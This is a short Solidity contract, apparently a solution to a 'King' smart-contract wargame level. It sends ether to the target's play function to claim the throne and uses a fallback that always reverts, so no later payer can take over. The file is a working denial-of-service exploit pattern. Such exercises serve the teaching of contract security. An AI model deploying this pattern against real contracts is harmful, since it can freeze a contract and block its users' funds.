pragma solidity ^0.5.0;

import "./King.sol";

contract KingAttack {

  function attack(address payable kingAddress) public payable {
    King kingContract = King(kingAddress);
    kingContract.play.value(msg.value)();
  }

  function() external payable {
    revert();
  }
}
